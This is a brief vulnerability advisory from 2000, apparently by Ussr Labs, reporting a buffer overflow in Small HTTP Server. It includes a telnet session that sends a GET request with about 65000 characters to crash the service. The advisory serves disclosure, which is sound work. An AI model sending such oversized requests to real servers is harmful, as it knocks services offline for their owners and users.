June 16, 2000

THE PROBLEM

The Ussr Labs team has recently discovered a buffer overflow memory
problem in the Small HTTP Server.

The http Server (Port 80) service has a overflow in the GET command

[hellme@die-communitech.net$ telnet example.com 80
Trying example.com...
Connected to example.com.
Escape character is '^]'.
GET /[buffer]

Where [buffer] is aprox. 65000 characters.

and the process containg the service crash
